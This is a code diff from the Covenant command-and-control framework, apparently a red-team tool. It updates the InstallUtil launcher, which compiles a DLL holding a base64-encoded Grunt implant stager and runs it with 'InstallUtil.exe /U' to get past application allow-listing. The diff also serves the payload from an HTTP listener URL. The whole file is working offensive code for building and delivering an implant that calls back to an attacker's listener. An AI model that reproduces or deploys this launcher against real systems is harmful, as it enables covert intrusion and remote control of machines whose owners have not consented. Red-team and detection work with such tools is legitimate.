@@ -7,9 +7,9 @@ using System.Linq;
 using System.Collections.Generic;
 using Microsoft.CodeAnalysis;
 
+using Covenant.Core;
 using Covenant.Models.Grunts;
 using Covenant.Models.Listeners;
-using Covenant.Core;
 
 namespace Covenant.Models.Launchers
 {
@@ -21,32 +21,33 @@ namespace Covenant.Models.Launchers
             this.Type = LauncherType.InstallUtil;
             this.Description = "Uses installutil.exe to start a Grunt via Uninstall method.";
             this.OutputKind = OutputKind.WindowsApplication;
+            this.CompressStager = true;
         }
 
-        public override string GetLauncher(Listener listener, Grunt grunt, HttpProfile profile)
+        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
         {
-            this.StagerCode = listener.GetGruntStagerCode(grunt, profile);
-            this.Base64ILByteString = listener.CompileGruntStagerCode(grunt, profile, this.OutputKind, true);
+            this.StagerCode = StagerCode;
+            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
             string code = CodeTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", this.Base64ILByteString);
 
-            List<Compiler.Reference> references = Common.DefaultReferences;
+            List<Compiler.Reference> references = grunt.DotNetVersion == Common.DotNetVersion.Net35 ? Common.DefaultNet35References : Common.DefaultNet40References;
             references.Add(new Compiler.Reference
             {
-                File = "System.Configuration.Install.dll",
-                Framework = grunt.DotNetFrameworkVersion,
+                File = grunt.DotNetVersion == Common.DotNetVersion.Net35 ? Common.CovenantAssemblyReferenceNet35Directory + "System.Configuration.Install.dll" :
+                                                                                    Common.CovenantAssemblyReferenceNet40Directory + "System.Configuration.Install.dll",
+                Framework = grunt.DotNetVersion,
                 Enabled = true
             });
-            this.DiskCode = Convert.ToBase64String(Compiler.Compile(new Compiler.CompilationRequest
+            this.DiskCode = Convert.ToBase64String(Compiler.Compile(new Compiler.CsharpFrameworkCompilationRequest
             {
+                Language = template.Language,
                 Source = code,
-                ResourceDirectory = Common.CovenantResourceDirectory,
-                ReferenceDirectory = Common.CovenantReferenceDirectory,
-                TargetDotNetVersion = grunt.DotNetFrameworkVersion,
+                TargetDotNetVersion = grunt.DotNetVersion,
                 OutputKind = OutputKind.DynamicallyLinkedLibrary,
                 References = references
             }));
 
-            this.LauncherString = "InstallUtil.exe" + " " + "/U" + " " + "file.dll";
+            this.LauncherString = "InstallUtil.exe" + " " + "/U" + " " + template.Name + ".dll";
             return this.LauncherString;
         }
 
@@ -55,14 +56,14 @@ namespace Covenant.Models.Launchers
             HttpListener httpListener = (HttpListener)listener;
             if (httpListener != null)
             {
-                Uri hostedLocation = new Uri(httpListener.Url + hostedFile.Path);
+                Uri hostedLocation = new Uri(httpListener.Urls.First() + hostedFile.Path);
                 this.LauncherString = "InstallUtil.exe" + " " + "/U" + " " + hostedFile.Path.Split('/').Last();
                 return hostedLocation.ToString();
             }
             else { return ""; }
         }
 
-        private static string CodeTemplate =
+        private static readonly string CodeTemplate =
 @"using System;
 class Program
 {
